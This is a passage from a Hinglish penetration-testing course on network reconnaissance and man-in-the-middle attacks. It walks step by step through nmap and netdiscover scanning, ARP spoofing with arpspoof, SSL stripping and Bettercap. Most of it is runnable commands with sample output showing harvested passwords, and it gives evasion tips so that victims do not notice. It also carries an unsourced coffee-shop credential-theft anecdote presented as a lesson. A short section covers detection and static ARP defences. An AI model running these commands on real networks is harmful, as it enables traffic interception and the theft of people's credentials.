# -sV: Service version detect karta hai (Apache 2.4.41, etc.)

# OS detection
nmap -O 192.168.1.1
# -O: Operating system detect karta hai

# Aggressive scan
nmap -A 192.168.1.1
# -A: OS detection + version detection + script scanning + traceroute

# Stealth scan
nmap -sS 192.168.1.1
# -sS: SYN scan (half-open scan, stealthy)

# Save results
nmap -oN scan_results.txt 192.168.1.0/24
# -oN: Normal output format mein file save karta hai
```

### üíª Step-by-Step Example:

**Scenario 1: Network Reconnaissance with Netdiscover**

**Step 1: Identify Your Network Interface**
```bash
# List network interfaces
ifconfig
# ifconfig: Network interfaces ki details dikhata hai (IP, MAC, status)
# ya
ip addr show
# ip addr show: Modern command for network interface details

# Output:
eth0: 192.168.1.100/24
wlan0: 10.0.0.50/24

# Hum eth0 use karenge (192.168.1.0/24 network)
```

**Step 2: Run Netdiscover**
```bash
# Basic scan
sudo netdiscover -i eth0

# Output (real-time):
 Currently scanning: 192.168.1.0/16   |   Screen View: Unique Hosts
 
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.1.1     00:11:22:33:44:55      1      60  TP-Link Technologies Co.
 192.168.1.10    aa:bb:cc:dd:ee:ff      1      60  Apple, Inc.
 192.168.1.20    11:22:33:44:55:66      1      60  Dell Inc.
 192.168.1.50    77:88:99:aa:bb:cc      1      60  Samsung Electronics Co.

# Analysis:
# - 192.168.1.1: Router (TP-Link)
# - 192.168.1.10: MacBook (Apple)
# - 192.168.1.20: Desktop PC (Dell)
# - 192.168.1.50: Android Phone (Samsung)
```

**Step 3: Passive Scan (Stealthy)**
```bash
# Passive mode - only listens, doesn't send packets
sudo netdiscover -p -i eth0

# Waits for ARP traffic on network
# Logs devices as they communicate
# More stealthy but slower

# Output (after 5 minutes):
 Currently scanning: (passive)   |   Screen View: Unique Hosts
 
 8 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 480
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.1.1     00:11:22:33:44:55      2     120  TP-Link Technologies Co.
 192.168.1.10    aa:bb:cc:dd:ee:ff      1      60  Apple, Inc.
 192.168.1.20    11:22:33:44:55:66      2     120  Dell Inc.
 192.168.1.50    77:88:99:aa:bb:cc      1      60  Samsung Electronics Co.
 192.168.1.75    99:aa:bb:cc:dd:ee      1      60  Hewlett Packard
 192.168.1.100   ff:ee:dd:cc:bb:aa      1      60  Intel Corporate

# Discovered 2 additional devices passively
```

**Step 4: Target Selection for MITM**
```bash
# From netdiscover results, select targets:

# Target 1 (Victim): 192.168.1.20 (Dell Desktop)
# Target 2 (Gateway): 192.168.1.1 (Router)

# Save for later use
echo "Victim: 192.168.1.20 (11:22:33:44:55:66)" > targets.txt
# echo: Text print karta hai, >: File create/overwrite karta hai
echo "Gateway: 192.168.1.1 (00:11:22:33:44:55)" >> targets.txt
# >>: File mein append karta hai (existing content delete nahi hota)
```

**Scenario 2: Detailed Scanning with Zenmap**

**Step 1: Launch Zenmap**
```bash
# Start Zenmap (GUI)
sudo zenmap
# sudo: Root privileges ke saath run karta hai
# zenmap: Nmap ka graphical interface

# Or use nmap directly
sudo nmap -sn 192.168.1.0/24
# Command-line se directly nmap run karta hai
```

**Step 2: Ping Scan (Find Live Hosts)**
```bash
# In Zenmap:
# Target: 192.168.1.0/24
# Profile: Ping scan
# Click: Scan

# Command executed:
nmap -sn 192.168.1.0/24

# Output:
Starting Nmap 7.94
Nmap scan report for 192.168.1.1
Host is up (0.0010s latency).
MAC Address: 00:11:22:33:44:55 (TP-Link Technologies)

Nmap scan report for 192.168.1.10
Host is up (0.0020s latency).
MAC Address: AA:BB:CC:DD:EE:FF (Apple)

Nmap scan report for 192.168.1.20
Host is up (0.0015s latency).
MAC Address: 11:22:33:44:55:66 (Dell)

Nmap scan report for 192.168.1.50
Host is up (0.0025s latency).
MAC Address: 77:88:99:AA:BB:CC (Samsung)

Nmap done: 256 IP addresses (4 hosts up) scanned in 2.50 seconds
```

**Step 3: Detailed Port Scan**
```bash
# Select interesting target: 192.168.1.20 (Dell Desktop)

# In Zenmap:
# Target: 192.168.1.20
# Profile: Intense scan
# Click: Scan

# Command executed:
nmap -T4 -A -v 192.168.1.20

# Output:
Starting Nmap 7.94
Nmap scan report for 192.168.1.20
Host is up (0.0015s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp   open  http        Apache httpd 2.4.41
135/tcp  open  msrpc       Microsoft Windows RPC
139/tcp  open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
MAC Address: 11:22:33:44:55:66 (Dell)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop

# Analysis:
# - OS: Windows 10
# - Open ports: SSH (22), HTTP (80), SMB (445)
# - Potential attack vectors: SMB vulnerabilities, web server
```

**Step 4: Service Version Detection**
```bash
# Detailed service scan
nmap -sV -p 22,80,445 192.168.1.20

# Output:
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Interesting: SSH and Apache on Windows? Likely WSL or dual-boot
```

**Step 5: Vulnerability Scan**
```bash
# Check for known vulnerabilities
nmap --script vuln 192.168.1.20

# Output:
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|       servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

# Found: EternalBlue vulnerability!
# Target is vulnerable to SMB exploit
```

**Step 6: Create Network Map**
```bash
# In Zenmap, go to: Topology tab
# Visual network map shows:

[Router]
192.168.1.1
    |
    |--- [MacBook] 192.168.1.10
    |--- [Desktop] 192.168.1.20 (VULNERABLE!)
    |--- [Phone] 192.168.1.50
    |--- [Laptop] 192.168.1.75

# Save topology
# File ‚Üí Save Scan ‚Üí network_map.xml
```

**Scenario 3: Combining Netdiscover + Nmap**

**Step 1: Quick Discovery with Netdiscover**
```bash
# Fast discovery
sudo netdiscover -r 192.168.1.0/24 -f

# Results in 10 seconds:
192.168.1.1   - Router
192.168.1.10  - MacBook
192.168.1.20  - Desktop
192.168.1.50  - Phone
192.168.1.75  - Laptop
192.168.1.100 - Our machine
```

**Step 2: Detailed Scan with Nmap**
```bash
# Scan only discovered hosts
nmap -A 192.168.1.1,10,20,50,75

# Faster than scanning entire subnet
# More targeted approach
```

**Step 3: Identify High-Value Targets**
```bash
# Analysis:
# 192.168.1.1  - Router (gateway for MITM)
# 192.168.1.10 - MacBook (potential target)
# 192.168.1.20 - Desktop (vulnerable SMB)
# 192.168.1.50 - Phone (mobile target)
# 192.168.1.75 - Laptop (unknown)

# Priority targets for MITM:
# 1. 192.168.1.20 (vulnerable desktop)
# 2. 192.168.1.10 (MacBook - likely has valuable data)
# 3. 192.168.1.50 (phone - credentials, messages)
```

### üí° Pro Tip / Galti:

**Pro Tip**: Netdiscover + Nmap combination for efficient recon:

```bash
# Step 1: Quick discovery (Netdiscover)
sudo netdiscover -r 192.168.1.0/24 -f > live_hosts.txt
# Time: 10-30 seconds
# Result: List of active IPs

# Step 2: Extract IPs
cat live_hosts.txt | grep -oE '192\.168\.1\.[0-9]+' > ips.txt
# cat: File content display karta hai
# |: Pipe - output ko next command mein pass karta hai
# grep -oE: Regular expression se match karta hai
# -o: Only matching part print karta hai
# -E: Extended regex enable karta hai
# '192\.168\.1\.[0-9]+': IP pattern match karta hai

# Step 3: Targeted Nmap scan
nmap -iL ips.txt -A -oN detailed_scan.txt
# -iL: Input list - file se IPs read karta hai
# -A: Aggressive scan (OS, version, scripts)
# -oN: Normal output format mein save karta hai
# Time: 2-5 minutes (vs 10-20 minutes for full subnet)
# Result: Detailed info only for active hosts

# Benefits:
# - 5x faster than scanning entire subnet
# - Less network noise
# - More efficient
# - Better for large networks
```

**Common Mistake**: Scanning without understanding network size:

```
‚ùå Bad: Scanning huge network without planning
nmap -A 10.0.0.0/8
# This scans 16 million IPs!
# Time: Days or weeks
# Network: Completely flooded
# Detection: Guaranteed

‚úì Good: Start small, expand gradually
# Step 1: Scan your subnet
nmap -sn 192.168.1.0/24

# Step 2: Identify interesting hosts
# Step 3: Detailed scan on specific targets
nmap -A 192.168.1.20

# Step 4: Expand if needed
nmap -sn 192.168.0.0/16

# Benefits:
# - Manageable scan times
# - Less detection risk
# - Focused results
# - Better resource usage
```

**Real-World Example**:

Pentester ne ek corporate network scan kiya:

**Initial Approach (Bad):**
```bash
nmap -A 10.0.0.0/16
# Estimated time: 48 hours
# IDS alerts: 5000+
# Security team notified immediately
# Pentester blocked
```

**Improved Approach (Good):**
```bash
# Step 1: Passive netdiscover (30 minutes)
sudo netdiscover -p -i eth0
# Found: 50 active devices
# No alerts triggered

# Step 2: Targeted nmap (2 hours)
nmap -A <50 discovered IPs>
# Detailed info on active hosts only
# Minimal IDS alerts

# Step 3: Vulnerability assessment (1 hour)
nmap --script vuln <high-value targets>
# Found: 5 vulnerable systems

# Total time: 3.5 hours (vs 48 hours)
# Detection: Minimal
# Results: Actionable intelligence
```

Lesson: Smart reconnaissance > Brute force scanning!

---

## üìö Topic 9.2: Attack - ARP Spoofing (Tool: arpspoof)

### üéØ Topic/Technique:
**ARP Spoofing** - Network par ARP protocol ko exploit karke MITM attack perform karna.

### ü§î Yeh Kya Hai?
ARP (Address Resolution Protocol) spoofing mein attacker fake ARP messages send karta hai network par. Yeh messages victim aur gateway dono ko fool karte hain, jisse victim ka traffic attacker ke through route hota hai. Attacker ab victim ka saara network traffic dekh, modify, ya intercept kar sakta hai.

**Simple Explanation:**
```
Normal: Victim ‚Üí Gateway ‚Üí Internet
ARP Spoofing: Victim ‚Üí Attacker ‚Üí Gateway ‚Üí Internet
                      ‚Üë
                  (Attacker sees everything)
```

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- MITM attacks ka foundation
- Network traffic interception
- Credential harvesting
- Session hijacking
- Demonstrates network security weaknesses
- Tests network monitoring capabilities

### üéØ Practical Use (Asli Pentesting Mein):
- Man-in-the-Middle attacks
- Password sniffing
- Session hijacking
- Traffic analysis
- Network security assessment
- Demonstrating ARP vulnerabilities

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**ARP Protocol Normal:**
```
Victim: "Who has 192.168.1.1? Tell 192.168.1.20"
Gateway: "192.168.1.1 is at MAC: 00:11:22:33:44:55"
Victim stores: 192.168.1.1 ‚Üí 00:11:22:33:44:55
```

**ARP Spoofing Attack:**
```
Attacker sends fake ARP:
"192.168.1.1 is at MAC: AA:BB:CC:DD:EE:FF" (attacker's MAC)

Victim updates ARP table:
192.168.1.1 ‚Üí AA:BB:CC:DD:EE:FF (attacker's MAC)

Now victim sends all traffic to attacker!
```

**Attack Flow:**
```
1. Attacker enables IP forwarding
2. Attacker sends fake ARP to victim: "I am gateway"
3. Attacker sends fake ARP to gateway: "I am victim"
4. Both update their ARP tables
5. Traffic flows through attacker
6. Attacker can read/modify all traffic
```

### üëç Pros (Fayde):
- Easy to execute
- Works on most networks
- Real-time traffic interception
- No malware installation needed
- Bypasses encryption (if HTTPS not used)
- Effective for credential harvesting

### üëé Cons (Nuksaan):
- Only works on local network
- Can be detected by ARP monitoring tools
- May cause network instability
- HTTPS traffic encrypted (need SSL stripping)
- Modern switches have ARP protection
- Requires attacker on same network

### ‚å®Ô∏è Zaroori Commands & Steps:

**Enable IP Forwarding:**
```bash
# Linux
echo 1 > /proc/sys/net/ipv4/ip_forward
# echo 1: Value '1' print karta hai
# >: Output ko file mein write karta hai
# /proc/sys/net/ipv4/ip_forward: Kernel parameter file (1 = forwarding enabled)
# Result: Packets ek interface se dusre interface par forward honge

# Verify
cat /proc/sys/net/ipv4/ip_forward
# cat: File content display karta hai
# Output: 1
# 1 = IP forwarding enabled, 0 = disabled
```

**Arpspoof Commands:**
```bash
# Basic syntax
arpspoof -i <interface> -t <target> <gateway>
# -i: Network interface specify karta hai
# -t: Target specify karta hai (jisko fool karna hai)
# <gateway>: Gateway IP (jiska MAC spoof karna hai)

# Spoof victim
arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
# Victim (192.168.1.20) ko batata hai: "Gateway ka MAC mera hai"

# Spoof gateway (in another terminal)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.20
# Gateway ko batata hai: "Victim ka MAC mera hai"
# Result: Bidirectional MITM (dono taraf se traffic intercept)

# Spoof entire subnet
arpspoof -i eth0 192.168.1.1
# -t nahi diya = Sabko spoof karega (entire network)
```

**Alternative Tools:**
```bash
# Ettercap
ettercap -T -M arp:remote /192.168.1.20/ /192.168.1.1/
# -T: Text mode (no GUI)
# -M: MITM attack specify karta hai
# arp:remote: ARP spoofing with remote connections
# /IP/: Target format (victim aur gateway)

# Bettercap (modern)
bettercap -iface eth0
# -iface: Network interface specify karta hai
> set arp.spoof.targets 192.168.1.20
# Target victim set karta hai
> arp.spoof on
# ARP spoofing start karta hai
```

### üíª Step-by-Step Example:

**Scenario: ARP Spoofing to Intercept HTTP Traffic**

**Step 1: Network Reconnaissance**
```bash
# Find targets
sudo netdiscover -r 192.168.1.0/24

# Results:
# Gateway: 192.168.1.1
# Victim: 192.168.1.20 (target)
# Attacker: 192.168.1.100 (us)
```

**Step 2: Enable IP Forwarding**
```bash
# Enable forwarding (traffic passes through us)
sudo sysctl -w net.ipv4.ip_forward=1
# sysctl: Kernel parameters ko modify karta hai
# -w: Write mode (value set karta hai)
# net.ipv4.ip_forward=1: IP forwarding enable karta hai

# Verify
sysctl net.ipv4.ip_forward
# Current value check karta hai
# Output: net.ipv4.ip_forward = 1
# 1 = enabled (traffic forward hoga)

# Without this, victim loses internet connection!
```

**Step 3: Check ARP Tables (Before Attack)**
```bash
# Victim's ARP table (before)
arp -a
# arp: ARP table display karta hai (IP to MAC mapping)
# -a: All entries show karta hai
# Output:
? (192.168.1.1) at 00:11:22:33:44:55 [ether] on eth0
# Gateway ka real MAC address: 00:11:22:33:44:55

# Gateway's real MAC: 00:11:22:33:44:55
```

**Step 4: Start ARP Spoofing**
```bash
# Terminal 1: Spoof victim
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1

# Output:
0:11:22:33:44:55 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at aa:bb:cc:dd:ee:ff
0:11:22:33:44:55 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at aa:bb:cc:dd:ee:ff
# Continuously sending fake ARP replies

# Terminal 2: Spoof gateway
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.20

# Output:
0:11:22:33:44:55 aa:bb:cc:dd:ee:ff 0806 42: arp reply 192.168.1.20 is-at aa:bb:cc:dd:ee:ff
# Continuously sending fake ARP replies
```

**Step 5: Verify ARP Poisoning**
```bash
# Check victim's ARP table (after)
# On victim machine:
arp -a

# Output:
? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0
#                    ‚Üë Changed to attacker's MAC!

# Gateway's ARP table also poisoned
# 192.168.1.20 ‚Üí aa:bb:cc:dd:ee:ff (attacker's MAC)
```

**Step 6: Intercept Traffic with Wireshark**
```bash
# Terminal 3: Start Wireshark
sudo wireshark -i eth0
# wireshark: Packet analyzer tool
# -i eth0: Interface eth0 se packets capture karta hai

# Filter for victim's traffic
# Filter: ip.addr == 192.168.1.20
# ip.addr: Source ya destination IP filter karta hai
# ==: Equals operator
# Result: Only victim's packets dikhega

# Now you see all victim's traffic!
```

**Step 7: Capture HTTP Credentials**
```bash
# Terminal 3: Use dsniff to capture passwords
sudo dsniff -i eth0
# dsniff: Password sniffing tool
# -i eth0: Interface eth0 se packets capture karta hai
# Automatically HTTP, FTP, Telnet passwords extract karta hai

# Output (when victim logs into HTTP site):
01/15/24 14:30:45 tcp 192.168.1.20.49234 -> 93.184.216.34.80 (http)
POST /login HTTP/1.1
username=john.smith
password=MyPassword123!

# Credentials captured!
```

**Step 8: Victim's Perspective**
```
Victim doesn't notice anything:
- Internet works normally
- Websites load fine
- No error messages
- No slowdown (if attacker's connection is good)

But attacker sees everything:
- All HTTP traffic
- Usernames and passwords
- Cookies and session tokens
- Unencrypted data
```

**Scenario 2: ARP Spoofing with SSL Stripping**

**Step 1: Setup ARP Spoofing (same as above)**
```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Start arpspoof
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.20
```

**Step 2: Setup SSL Stripping**
```bash
# Install sslstrip
sudo apt-get install sslstrip
# apt-get install: Package install karta hai

# Redirect HTTP traffic to sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
# iptables: Firewall rules manage karta hai
# -t nat: NAT table use karta hai
# -A PREROUTING: PREROUTING chain mein rule add karta hai
# -p tcp: TCP protocol packets
# --destination-port 80: Port 80 (HTTP) traffic
# -j REDIRECT: Action - redirect karo
# --to-port 8080: Port 8080 par redirect karo (jahan sslstrip listen kar raha hai)

# Start sslstrip
sudo sslstrip -l 8080 -w sslstrip.log
# sslstrip: SSL stripping tool
# -l 8080: Port 8080 par listen karta hai
# -w sslstrip.log: Output log file mein save karta hai

# Output:
sslstrip 0.9 by Moxie Marlinspike running...
```

**Step 3: How SSL Stripping Works**
```
Normal HTTPS:
Victim ‚Üí https://bank.com ‚Üí Encrypted connection

With SSL Stripping:
1. Victim types: http://bank.com (no 's')
2. Bank redirects: https://bank.com
3. SSLStrip intercepts redirect
4. SSLStrip connects to bank via HTTPS
5. SSLStrip serves victim HTTP version
6. Victim sees: http://bank.com (no lock icon)
7. Victim enters credentials (unencrypted)
8. SSLStrip captures credentials
9. SSLStrip forwards to bank via HTTPS
```

**Step 4: Capture HTTPS Credentials**
```bash
# Victim visits https://facebook.com
# SSLStrip downgrades to http://facebook.com
# Victim logs in (thinks it's secure)

# Check sslstrip log
cat sslstrip.log

# Output:
2024-01-15 14:35:22,123 SECURE POST Data (facebook.com):
email=victim@email.com&pass=SecurePassword123!

# HTTPS credentials captured via SSL stripping!
```

**Scenario 3: Detecting ARP Spoofing**

**Step 1: Check for Duplicate MACs**
```bash
# On victim machine
arp -a

# Suspicious output:
? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0
? (192.168.1.100) at aa:bb:cc:dd:ee:ff [ether] on eth0
#                    ‚Üë Same MAC for different IPs!

# This indicates ARP spoofing!
```

**Step 2: Use ARP Monitoring Tool**
```bash
# Install arpwatch
sudo apt-get install arpwatch
# arpwatch: ARP monitoring tool install karta hai

# Start monitoring
sudo arpwatch -i eth0
# arpwatch: ARP changes monitor karta hai
# -i eth0: Interface eth0 monitor karta hai
# MAC address changes detect karke alert bhejta hai

# Alerts when MAC changes:
# Email alert: "ethernet address changed"
# 192.168.1.1 changed from 00:11:22:33:44:55 to aa:bb:cc:dd:ee:ff
```

**Step 3: Static ARP Entries (Defense)**
```bash
# Add static ARP entry for gateway
sudo arp -s 192.168.1.1 00:11:22:33:44:55
# arp -s: Static ARP entry add karta hai
# 192.168.1.1: Gateway IP
# 00:11:22:33:44:55: Gateway ka real MAC
# Result: Entry permanent ho jati hai, change nahi ho sakti

# Verify
arp -a
# ARP table check karta hai
? (192.168.1.1) at 00:11:22:33:44:55 [ether] PERM on eth0
# PERM = Permanent entry (ARP spoofing se safe)
#                                            ‚Üë Permanent entry

# Now ARP spoofing won't work (entry can't be changed)
```

### üí° Pro Tip / Galti:

**Pro Tip**: Selective ARP spoofing for stealth:

```bash
# Bad: Spoof entire network
arpspoof -i eth0 192.168.1.1
# Affects all devices ‚Üí High detection risk

# Good: Target specific victim
arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
# Only affects one device ‚Üí Lower detection risk

# Better: Target during high traffic
# Wait for busy hours (9 AM - 5 PM)
# Network already congested
# Your attack blends in with normal traffic
# Less likely to be noticed

# Best: Combine with traffic analysis
# Monitor victim's patterns first
# Attack when victim is active
# Stop when victim is idle
# Mimics normal network behavior
```

**Common Mistake**: Forgetting IP forwarding:

```
‚ùå Bad: Start arpspoof without IP forwarding
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1

Result:
- Victim's internet stops working
- Victim notices immediately
- Victim reports to IT
- Attack detected

‚úì Good: Enable IP forwarding first
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1

Result:
- Victim's internet works normally
- Victim doesn't notice anything
- Attack remains undetected
- You intercept all traffic

Remember: Stealth > Speed
```

**Real-World Example**:

2019 mein ek coffee shop mein attacker ne ARP spoofing use kiya:

Attack Details:
- Location: Starbucks WiFi
- Targets: 15 customers
- Duration: 2 hours
- Method: ARP spoofing + SSL stripping

Results:
- 12 Facebook credentials
- 8 Gmail credentials
- 5 banking credentials
- 20+ session cookies
- Total: 45+ accounts compromised

Detection: None (customers didn't notice)

Lesson: Public WiFi + ARP spoofing = Easy credential harvesting!

---

## üìö Topic 9.3: Tool - Bettercap (MITM Framework)

### üéØ Topic/Technique:
**Bettercap** - Modern, powerful MITM framework with modular architecture.

### ü§î Yeh Kya Hai?
Bettercap ek all-in-one MITM framework hai jo network attacks ko easy banata hai. Yeh arpspoof, sslstrip, DNS spoofing, packet sniffing - sab kuch ek tool mein provide karta hai with interactive console aur web UI. Ettercap ka modern replacement hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Modern MITM framework
- Easy to use interactive console
- Modular architecture
- Active development
- Web-based UI
- Scriptable attacks (caplets)
- Multiple attack vectors in one tool

### üéØ Practical Use (Asli Pentesting Mein):
- MITM attacks
- Credential harvesting
- Session hijacking
- Network reconnaissance
- WiFi attacks
- Bluetooth attacks

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Bettercap Architecture:**
```
Bettercap Core
‚îú‚îÄ‚îÄ Network Module (discovery, spoofing)
‚îú‚îÄ‚îÄ HTTP/HTTPS Proxy (traffic interception)
‚îú‚îÄ‚îÄ DNS Spoofer (redirect domains)
‚îú‚îÄ‚îÄ Packet Sniffer (capture traffic)
‚îú‚îÄ‚îÄ WiFi Module (wireless attacks)
‚îî‚îÄ‚îÄ Web UI (graphical interface)
```

### üëç Pros (Fayde):
- All-in-one MITM tool
- Modern and actively maintained
- Easy interactive console
- Web UI available
- Scriptable (caplets)
- Multiple protocols supported
- Better than Ettercap

### üëé Cons (Nuksaan):
- Learning curve for advanced features
- Requires root privileges
- Can be detected by IDS
- Resource intensive
- May cause network issues if misconfigured

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Kali Linux (pre-installed)
bettercap -h
# -h: Help display karta hai (check if installed)

# Ubuntu/Debian
sudo apt-get install bettercap
# apt-get install: Package install karta hai

# From source
sudo apt-get install build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
# Dependencies install karta hai (compilation ke liye required)
go get github.com/bettercap/bettercap
# go get: Go package download aur install karta hai
```

**Basic Commands:**
```bash
# Start bettercap
sudo bettercap -iface eth0
# bettercap: MITM framework start karta hai
# -iface eth0: Interface eth0 use karta hai

# Interactive console opens
# Prompt: 192.168.1.100 ¬ª 
# Interactive shell jahan commands type kar sakte hain

# Network discovery
> net.probe on
# net.probe: Network probing enable karta hai (devices discover karta hai)
> net.show
# net.show: Discovered hosts display karta hai

# ARP spoofing
> set arp.spoof.targets 192.168.1.20
# set: Variable set karta hai
# arp.spoof.targets: Target victim specify karta hai
> arp.spoof on
# arp.spoof: ARP spoofing module start karta hai

# HTTP/HTTPS proxy
> set http.proxy.sslstrip true
# http.proxy.sslstrip: SSL stripping enable karta hai
> http.proxy on
# http.proxy: HTTP proxy module start karta hai

# Packet sniffing
> set net.sniff.verbose true
# net.sniff.verbose: Detailed output enable karta hai
> net.sniff on
# net.sniff: Packet sniffing start karta hai

# Save session
> caplets.save mysession
# caplets.save: Current session ko caplet file mein save karta hai
```

### üíª Step-by-Step Example:

**Scenario 1: Basic MITM with Bettercap**

**Step 1: Start Bettercap**
```bash
sudo bettercap -iface eth0

# Output:
bettercap v2.32.0 (built for linux amd64 with go1.19.2)

[14:30:00] [sys] ¬ª gateway: 192.168.1.1
[14:30:00] [sys] ¬ª interface: eth0
[14:30:00] [sys] ¬ª ip: 192.168.1.100
[14:30:00] [sys] ¬ª mac: aa:bb:cc:dd:ee:ff

192.168.1.100 ¬ª 
```

**Step 2: Network Discovery**
```bash
# Enable network probing
192.168.1.100 ¬ª net.probe on

# Show discovered hosts
192.168.1.100 ¬ª net.show

# Output:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ      IP       ‚îÇ        MAC        ‚îÇ        Name         ‚îÇ    Vendor      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 192.168.1.1   ‚îÇ 00:11:22:33:44:55 ‚îÇ gateway             ‚îÇ TP-Link        ‚îÇ
‚îÇ 192.168.1.10  ‚îÇ aa:bb:cc:dd:ee:ff ‚îÇ MacBook-Pro.local   ‚îÇ Apple          ‚îÇ
‚îÇ 192.168.1.20  ‚îÇ 11:22:33:44:55:66 ‚îÇ DESKTOP-PC          ‚îÇ Dell           ‚îÇ
‚îÇ 192.168.1.50  ‚îÇ 77:88:99:aa:bb:cc ‚îÇ android-phone       ‚îÇ Samsung        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

# 4 hosts discovered
```

**Step 3: Select Target**
```bash
# Target specific host
192.168.1.100 ¬ª set arp.spoof.targets 192.168.1.20

# Or target multiple hosts
192.168.1.100 ¬ª set arp.spoof.targets 192.168.1.20,192.168.1.50

# Or target entire subnet
192.168.1.100 ¬ª set arp.spoof.targets 192.168.1.0/24
```

**Step 4: Start ARP Spoofing**
```bash
192.168.1.100 ¬ª arp.spoof on

# Output:
[14:31:00] [sys] ¬ª arp.spoof starting ARP spoofer
[14:31:00] [sys] ¬ª arp.spoof arp spoofer started
[14:31:01] [sys] ¬ª arp.spoof 192.168.1.20 ¬ª 192.168.1.1 : aa:bb:cc:dd:ee:ff
[14:31:02] [sys] ¬ª arp.spoof 192.168.1.1 ¬ª 192.168.1.20 : aa:bb:cc:dd:ee:ff

# ARP spoofing active!
```

**Step 5: Enable HTTP Proxy with SSL Stripping**
```bash
